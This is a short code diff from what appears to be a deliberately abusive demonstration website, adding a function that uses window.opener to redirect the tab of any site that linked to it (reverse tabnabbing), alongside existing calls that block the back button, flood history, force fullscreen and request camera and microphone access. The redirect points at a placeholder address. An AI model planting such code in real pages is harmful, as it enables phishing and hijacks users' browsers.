@@ -187,7 +187,7 @@ function init () {
     if (event.key === 'Meta' || event.key === 'Control') {
       showModal()
     } else {
-      if (!isChildWindow() && Math.random() < 0.20) requestFullscreen()
+      if (isParentWindow() && Math.random() < 0.20) requestFullscreen()
       else requestCameraAndMic()
     }
 
@@ -221,6 +221,7 @@ function initParentWindow () {
   blockBackButton()
   fillHistory()
   startInvisiblePictureInPictureVideo()
+  attemptToTakeoverReferrerWindow()
 
   interceptUserInput(event => {
     triggerFileDownload()
@@ -244,8 +245,27 @@ function isChildWindow () {
   return window.opener && isParentSameOrigin()
 }
 
+function isParentWindow () {
+  return !isChildWindow()
+}
+
 /**
- * Returns true if the parent window is on the same origin
+ * Sites that link to theannoyingsite.com may specify `target='_blank'` to open the
+ * link in a new window. For example, Messenger.com from Facebook does this.
+ * However, that means that `window.opener` will be set, which allows us to redirect
+ * that window. YES, WE CAN REDIRECT THE SITE THAT LINKED TO US.
+ * Learn more here: https://www.jitbit.com/alexblog/256-targetblank---the-most-underestimated-vulnerability-ever/
+ */
+function attemptToTakeoverReferrerWindow () {
+  if (isParentWindow() && !isParentSameOrigin()) {
+    window.opener.location = 'http://example.com'
+  }
+}
+
+/**
+ * Returns true if the parent window is on the same origin. It's not enough to check
+ * that `window.opener` is set, because that will also get set if a site on a
+ * different origin links to theannoyingsite.com with `target='_blank'`.
  */
 function isParentSameOrigin () {
   try {
